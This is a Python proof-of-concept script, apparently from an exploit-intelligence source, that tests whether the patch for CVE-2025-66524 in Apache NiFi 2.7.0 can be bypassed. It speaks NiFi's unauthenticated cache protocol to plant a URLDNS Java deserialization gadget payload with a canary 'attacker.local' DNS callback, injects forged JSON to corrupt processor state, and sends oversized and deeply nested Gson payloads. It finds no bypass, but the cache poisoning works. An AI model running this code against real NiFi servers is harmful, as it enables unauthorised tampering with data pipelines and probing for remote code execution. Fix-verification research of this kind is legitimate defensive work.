#!/usr/bin/env python3
# Exploit Title: Apache NiFi 2.7.0 - CVE-2025-66524 Fix Bypass Analysis
# Exploit Author: Exploit Intelligence Platform (EIP)
# Vendor Homepage: https://nifi.apache.org/
# Version: Apache NiFi 2.7.0 (patched)
# Tested on: Apache NiFi 2.7.0 / JDK 21
# CVE: CVE-2025-66524
# Reference: https://exploit-intel.com
"""
Bypass PoC for CVE-2025-66524 Fix Assessment

Tests whether the fix in Apache NiFi 2.7.0 (commit 1c081c15) can be bypassed.
The fix replaced GenericObjectSerDe (ObjectInputStream-based) with StringSerDe
(UTF-8) and MapStringSerDe (Gson JSON) for cache serialization.

This script tests multiple bypass vectors against the PATCHED NiFi 2.7.0:

1. VECTOR 1 - Original URLDNS with OLD key format (Java serialized key)
   Hypothesis: Maybe the patched NiFi still reads keys in the old format
   Expected: FAIL - key format mismatch

2. VECTOR 2 - URLDNS with NEW key format (plain UTF-8 key)
   Hypothesis: Maybe the patched NiFi still uses ObjectInputStream for values
   Expected: FAIL - value is parsed by Gson, not ObjectInputStream

3. VECTOR 3 - State corruption via JSON injection
   Hypothesis: Inject valid JSON to corrupt processor state
   Expected: PARTIAL SUCCESS - state corruption but no code execution

4. VECTOR 4 - Gson edge case attacks
   Hypothesis: Trigger Gson vulnerability via crafted JSON
   Expected: FAIL - Gson for Map<String,String> is inherently safe

Usage:
    python3 bypass_poc.py <cache_host> [cache_port]
"""

import socket
import struct
import sys
import os
import time
import subprocess
import json

# ===== Configuration =====
DEFAULT_HOST = "cve-2025-66524-services-patched"
DEFAULT_PORT = 4557
# Patched processor UUID (from setup output)
PATCHED_PROCESSOR_UUID = "a761c25b-019c-1000-3372-b15e5186535a"
CANARY_HOSTNAME = "bypass-test-cve-2025-66524.attacker.local"
NIFI_CONTAINER = "cve-2025-66524-nifi-patched"

# ===== NiFi Cache Protocol Implementation =====

def nifi_connect(host, port, timeout=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    return sock


def nifi_handshake(sock):
    sock.sendall(b'\x4e\x69\x46\x69')  # "NiFi"
    sock.sendall(struct.pack('>I', 3))    # Version 3
    status = sock.recv(1)
    if status != b'\x14':
        raise Exception(f"Handshake failed: {status.hex()}")
    return True


def nifi_put(sock, key_bytes, value_bytes):
    buf = struct.pack('>H', 3) + b'put'
    buf += struct.pack('>I', len(key_bytes)) + key_bytes
    buf += struct.pack('>I', len(value_bytes)) + value_bytes
    sock.sendall(buf)
    resp = sock.recv(1)
    return resp == b'\x01'


def nifi_get(sock, key_bytes):
    buf = struct.pack('>H', 3) + b'get'
    buf += struct.pack('>I', len(key_bytes)) + key_bytes
    sock.sendall(buf)
    vlen_bytes = sock.recv(4)
    vlen = struct.unpack('>I', vlen_bytes)[0]
    if vlen == 0:
        return b''
    value = b''
    while len(value) < vlen:
        value += sock.recv(vlen - len(value))
    return value


def nifi_close(sock):
    try:
        sock.sendall(struct.pack('>H', 5) + b'close')
    except:
        pass
    sock.close()


def java_serialize_string(s):
    """Serialize a Java String using ObjectOutputStream format (old format)."""
    encoded = s.encode('utf-8')
    buf = b'\xac\xed\x00\x05'  # STREAM_MAGIC + STREAM_VERSION
    buf += b'\x74'              # TC_STRING
    buf += struct.pack('>H', len(encoded))
    buf += encoded
    return buf


def utf8_key(s):
    """Plain UTF-8 key format (new format used by StringSerDe)."""
    return s.encode('utf-8')


def get_log_baseline():
    """Get current NiFi log line count."""
    try:
        result = subprocess.run(
            ["docker", "exec", NIFI_CONTAINER, "wc", "-l",
             "/opt/nifi/nifi-current/logs/nifi-app.log"],
            capture_output=True, text=True, timeout=10
        )
        return int(result.stdout.strip().split()[0])
    except:
        return 0


def get_new_logs(baseline):
    """Get NiFi logs since baseline."""
    try:
        result = subprocess.run(
            ["docker", "exec", NIFI_CONTAINER, "tail", "-n", f"+{baseline + 1}",
             "/opt/nifi/nifi-current/logs/nifi-app.log"],
            capture_output=True, text=True, timeout=10
        )
        return result.stdout
    except:
        return ""


def start_dns_capture():
    """Start DNS capture on NiFi container."""
    pcap_file = "/tmp/bypass-dns.pcap"
    try:
        subprocess.run(
            ["docker", "exec", "-u", "root", NIFI_CONTAINER,
             "pkill", "-f", "tcpdump"], capture_output=True)
        time.sleep(0.5)
        subprocess.run(
            ["docker", "exec", "-u", "root", "-d", NIFI_CONTAINER,
             "tcpdump", "-i", "any", "-n", "port", "53",
             "-w", pcap_file, "-c", "100"],
            check=True, capture_output=True
        )
        return pcap_file
    except Exception as e:
        print(f"    WARNING: Could not start DNS capture: {e}")
        return None


def check_dns_capture(pcap_file, canary):
    """Check if DNS capture contains canary hostname."""
    if not pcap_file:
        return False, ""
    try:
        subprocess.run(
            ["docker", "exec", "-u", "root", NIFI_CONTAINER,
             "pkill", "-f", "tcpdump"], capture_output=True)
        time.sleep(1)
        result = subprocess.run(
            ["docker", "exec", "-u", "root", NIFI_CONTAINER,
             "tcpdump", "-r", pcap_file, "-n"],
            capture_output=True, text=True, timeout=10
        )
        dns_output = result.stdout + result.stderr
        canary_prefix = canary.split('.')[0]
        found = canary_prefix in dns_output
        return found, dns_output
    except Exception as e:
        return False, f"Error: {e}"


def load_urldns_payload():
    """Load the pre-generated URLDNS payload."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    filepath = os.path.join(script_dir, "urldns_payload.bin")
    try:
        with open(filepath, 'rb') as f:
            return f.read()
    except FileNotFoundError:
        return None


def test_vector1(host, port, payload_bytes):
    """
    VECTOR 1: Original URLDNS attack with OLD key format (Java serialized).

    In the vulnerable version, the key was serialized via GenericObjectSerDe
    (ObjectOutputStream). In the patched version, the key is serialized via
    StringSerDe (plain UTF-8). If the patched NiFi still looks up the old
    key format, this would be a bypass.
    """
    print("=" * 70)
    print("VECTOR 1: URLDNS with OLD key format (Java serialized UUID)")
    print("=" * 70)
    print()
    print("  Hypothesis: Patched NiFi might still read keys in old format")
    print(f"  Key format: Java ObjectOutputStream serialized string")
    print(f"  Value: URLDNS gadget chain ({len(payload_bytes)} bytes)")
    print()

    old_key = java_serialize_string(PATCHED_PROCESSOR_UUID)
    print(f"  Old-format key (hex): {old_key.hex()[:60]}...")

    baseline = get_log_baseline()
    pcap = start_dns_capture()

    sock = nifi_connect(host, port)
    nifi_handshake(sock)

    success = nifi_put(sock, old_key, payload_bytes)
    print(f"  PUT result: {'SUCCESS' if success else 'FAILED'}")

    # Verify stored
    stored = nifi_get(sock, old_key)
    print(f"  Stored value matches: {stored == payload_bytes}")
    nifi_close(sock)

    print(f"  Waiting 40 seconds for processor trigger...")
    time.sleep(40)

    # Check DNS
    found, dns_output = check_dns_capture(pcap, CANARY_HOSTNAME)
    if found:
        print(f"  [!!] DNS QUERY DETECTED - BYPASS SUCCESSFUL!")
        print(f"  DNS output: {dns_output[:500]}")
        return True
    else:
        print(f"  [OK] No DNS query for canary hostname - bypass FAILED (expected)")
        # Check logs for any activity
        new_logs = get_new_logs(baseline)
        deser_evidence = [l for l in new_logs.split('\n')
                         if any(kw in l.lower() for kw in
                                ['objectinputstream', 'readobject', 'classcast',
                                 'classnotfound', 'urldns', 'attacker.local'])]
        if deser_evidence:
            print(f"  Log evidence:")
            for line in deser_evidence[:5]:
                print(f"    {line.strip()}")
        else:
            print(f"  No deserialization evidence in logs")
    print()
    return False


def test_vector2(host, port, payload_bytes):
    """
    VECTOR 2: URLDNS with NEW key format (plain UTF-8).

    The patched NiFi uses StringSerDe for key serialization, producing plain
    UTF-8 bytes. If we store a Java serialized payload at this key, will the
    patched NiFi's MapStringSerDe try to parse it and somehow trigger
    ObjectInputStream?
    """
    print("=" * 70)
    print("VECTOR 2: URLDNS with NEW key format (plain UTF-8 UUID)")
    print("=" * 70)
    print()
    print("  Hypothesis: Patched NiFi fetches value with new key format,")
    print("              but maybe MapStringSerDe falls back to ObjectInputStream")
    print(f"  Key format: Plain UTF-8 string '{PATCHED_PROCESSOR_UUID}'")
    print(f"  Value: URLDNS gadget chain ({len(payload_bytes)} bytes)")
    print()

    new_key = utf8_key(PATCHED_PROCESSOR_UUID)
    print(f"  New-format key (hex): {new_key.hex()[:60]}...")

    baseline = get_log_baseline()
    pcap = start_dns_capture()

    sock = nifi_connect(host, port)
    nifi_handshake(sock)

    # First read the current legitimate value
    current = nifi_get(sock, new_key)
    print(f"  Current legitimate value: {len(current)} bytes")
    if current:
        try:
            print(f"  Current content: {current.decode('utf-8')[:100]}")
        except:
            print(f"  Current content (hex): {current[:32].hex()}")

    # Inject URLDNS payload
    success = nifi_put(sock, new_key, payload_bytes)
    print(f"  PUT URLDNS payload: {'SUCCESS' if success else 'FAILED'}")

    stored = nifi_get(sock, new_key)
    print(f"  Stored value matches payload: {stored == payload_bytes}")
    nifi_close(sock)

    print(f"  Waiting 40 seconds for processor trigger...")
    time.sleep(40)

    # Check DNS
    found, dns_output = check_dns_capture(pcap, CANARY_HOSTNAME)
    if found:
        print(f"  [!!] DNS QUERY DETECTED - BYPASS SUCCESSFUL!")
        print(f"  DNS output: {dns_output[:500]}")
        return True
    else:
        print(f"  [OK] No DNS query for canary hostname - bypass FAILED (expected)")
        # Check logs - we expect Gson parse errors
        new_logs = get_new_logs(baseline)
        json_errors = [l for l in new_logs.split('\n')
                      if any(kw in l.lower() for kw in
                             ['jsonparse', 'jsonsyntax', 'malformedjson',
                              'gson', 'failed to recover',
                              'deserializationexception', 'ioexception',
                              'asanauserfetcher', 'objectinputstream'])]
        if json_errors:
            print(f"  Log evidence (Gson errors expected):")
            for line in json_errors[:10]:
                print(f"    {line.strip()}")
        else:
            print(f"  No relevant errors in logs (checking last 20 lines):")
            for line in new_logs.strip().split('\n')[-20:]:
                if line.strip() and ('ERROR' in line or 'WARN' in line or 'Exception' in line):
                    print(f"    {line.strip()}")
    print()

    # Restore legitimate value if we had one
    if current:
        sock = nifi_connect(host, port)
        nifi_handshake(sock)
        nifi_put(sock, new_key, current)
        nifi_close(sock)
        print(f"  [*] Restored original cache value")

    return False


def test_vector3(host, port):
    """
    VECTOR 3: State corruption via valid JSON injection.

    The patched NiFi expects a Map<String, String> as JSON. If we inject
    a crafted JSON payload, can we manipulate the processor's behavior in
    a security-relevant way?

    This is not a deserialization bypass but tests the remaining attack surface
    of the unauthenticated cache protocol.
    """
    print("=" * 70)
    print("VECTOR 3: State corruption via JSON injection")
    print("=" * 70)
    print()
    print("  Hypothesis: Inject crafted JSON to corrupt processor state")
    print("  This tests data integrity, not deserialization bypass")
    print()

    new_key = utf8_key(PATCHED_PROCESSOR_UUID)

    baseline = get_log_baseline()

    sock = nifi_connect(host, port)
    nifi_handshake(sock)

    # Read current state
    current = nifi_get(sock, new_key)
    print(f"  Current state: {len(current)} bytes")
    if current:
        try:
            print(f"  Content: {current.decode('utf-8')[:200]}")
        except:
            pass

    # Inject a crafted JSON state
    malicious_state = json.dumps({
        "org.apache.nifi.processors.asana.utils.AsanaUserFetcher.lastFingerprints": "CORRUPTED_BY_ATTACKER"
    }).encode('utf-8')

    success = nifi_put(sock, new_key, malicious_state)
    print(f"  PUT crafted JSON state: {'SUCCESS' if success else 'FAILED'}")

    # Verify
    stored = nifi_get(sock, new_key)
    if stored == malicious_state:
        print(f"  [+] State corruption SUCCEEDED - injected JSON accepted")
        print(f"  Stored: {stored.decode('utf-8')[:200]}")
    else:
        print(f"  [-] State corruption FAILED")

    nifi_close(sock)

    print(f"  Waiting 40 seconds for processor to read corrupted state...")
    time.sleep(40)

    # Check logs
    new_logs = get_new_logs(baseline)
    relevant = [l for l in new_logs.split('\n')
               if any(kw in l.lower() for kw in
                      ['corrupted', 'failed', 'error', 'exception',
                       'asana', 'recover', 'fingerprint'])]

    if relevant:
        print(f"  Log entries after state corruption:")
        for line in relevant[:10]:
            print(f"    {line.strip()}")
    else:
        print(f"  No errors from corrupted state (processor may have accepted it)")

    # Restore original
    if current:
        sock = nifi_connect(host, port)
        nifi_handshake(sock)
        nifi_put(sock, new_key, current)
        nifi_close(sock)
        print(f"  [*] Restored original cache value")

    print()
    print("  Assessment: Cache injection (data integrity) still works but")
    print("  does NOT lead to code execution. The attacker can corrupt state")
    print("  but not achieve RCE via the patched deserialization path.")
    print()
    return False  # State corruption is not an RCE bypass


def test_vector4(host, port):
    """
    VECTOR 4: Gson edge case attacks.

    Test if crafted JSON can trigger any unexpected behavior in Gson's
    deserialization of Map<String, String>.
    """
    print("=" * 70)
    print("VECTOR 4: Gson deserialization edge cases")
    print("=" * 70)
    print()
    print("  Hypothesis: Crafted JSON triggers Gson vulnerability")
    print()

    new_key = utf8_key(PATCHED_PROCESSOR_UUID)

    baseline = get_log_baseline()

    # Test payloads
    test_cases = [
        ("Deeply nested JSON", '{"a":' * 100 + '"x"' + '}' * 100),
        ("Very large value", '{"key":"' + 'A' * 100000 + '"}'),
        ("Unicode special chars", '{"key":"\\u0000\\uffff\\ud800"}'),
        ("Non-string value types", '{"key": 12345, "key2": true, "key3": null}'),
        ("Duplicate keys", '{"key":"val1","key":"val2","key":"val3"}'),
    ]

    sock = nifi_connect(host, port)
    nifi_handshake(sock)
    current = nifi_get(sock, new_key)
    nifi_close(sock)

    for name, payload in test_cases:
        print(f"  Testing: {name}")
        print(f"    Payload ({len(payload)} bytes): {payload[:80]}{'...' if len(payload) > 80 else ''}")

        sock = nifi_connect(host, port)
        nifi_handshake(sock)
        success = nifi_put(sock, new_key, payload.encode('utf-8'))
        nifi_close(sock)
        print(f"    PUT: {'OK' if success else 'FAIL'}")

    print(f"\n  Waiting 40 seconds for processor to process edge case payloads...")
    time.sleep(40)

    # Check logs
    new_logs = get_new_logs(baseline)
    errors = [l for l in new_logs.split('\n')
             if any(kw in l.lower() for kw in
                    ['stackoverflow', 'outofmemory', 'fatal', 'crash',
                     'core dump', 'segfault', 'rce', 'exploit',
                     'objectinputstream', 'readobject'])]
    if errors:
        print(f"  [!] Unexpected errors found:")
        for line in errors[:10]:
            print(f"    {line.strip()}")
    else:
        print(f"  [OK] No exploitable errors from Gson edge cases")

    # Restore
    if current:
        sock = nifi_connect(host, port)
        nifi_handshake(sock)
        nifi_put(sock, new_key, current)
        nifi_close(sock)
        print(f"  [*] Restored original cache value")

    print()
    return False


def main():
    target_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    print("=" * 70)
    print("CVE-2025-66524 BYPASS ANALYSIS")
    print("Testing fix completeness on Apache NiFi 2.7.0 (patched)")
    print("=" * 70)
    print()
    print(f"  Target cache: {target_host}:{target_port}")
    print(f"  Processor UUID: {PATCHED_PROCESSOR_UUID}")
    print(f"  NiFi container: {NIFI_CONTAINER}")
    print()

    # Load URLDNS payload
    payload_bytes = load_urldns_payload()
    if not payload_bytes:
        print("[-] FATAL: urldns_payload.bin not found")
        print("    This file should exist from the original PoC verification")
        sys.exit(1)
    print(f"[+] Loaded URLDNS payload: {len(payload_bytes)} bytes")
    print()

    results = {}

    # Vector 1: Old key format
    results['v1_old_key'] = test_vector1(target_host, target_port, payload_bytes)

    # Vector 2: New key format with URLDNS
    results['v2_new_key_urldns'] = test_vector2(target_host, target_port, payload_bytes)

    # Vector 3: State corruption
    results['v3_state_corruption'] = test_vector3(target_host, target_port)

    # Vector 4: Gson edge cases
    results['v4_gson_edge'] = test_vector4(target_host, target_port)

    # Final summary
    print()
    print("=" * 70)
    print("BYPASS ANALYSIS SUMMARY")
    print("=" * 70)
    print()

    any_bypass = any(results.values())

    for name, result in results.items():
        status = "BYPASS FOUND" if result else "NO BYPASS"
        indicator = "!!" if result else "OK"
        print(f"  [{indicator}] {name}: {status}")

    print()
    if any_bypass:
        print("  VERDICT: FIX IS INCOMPLETE — BYPASS FOUND")
    else:
        print("  VERDICT: FIX IS ADEQUATE — NO BYPASS FOUND")
        print()
        print("  The fix in commit 1c081c15 completely eliminates the")
        print("  deserialization vulnerability by replacing ObjectInputStream")
        print("  with UTF-8 string parsing (StringSerDe) and Gson JSON")
        print("  parsing (MapStringSerDe). No bypass was found.")
        print()
        print("  Residual risk: The cache server remains unauthenticated,")
        print("  allowing state corruption (data integrity). This is a")
        print("  separate issue from the deserialization vulnerability.")

    print("=" * 70)
    return 0 if not any_bypass else 1


if __name__ == '__main__':
    sys.exit(main())
